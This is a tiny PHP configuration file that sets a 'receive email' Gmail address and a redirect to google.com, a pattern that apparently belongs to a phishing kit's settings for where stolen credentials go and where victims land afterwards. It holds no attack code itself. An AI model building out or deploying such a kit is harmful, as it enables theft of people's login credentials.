<?php 
$Receive_email="mcleans.mgnn@gmail.com";
$redirect="https://www.google.com/";
?>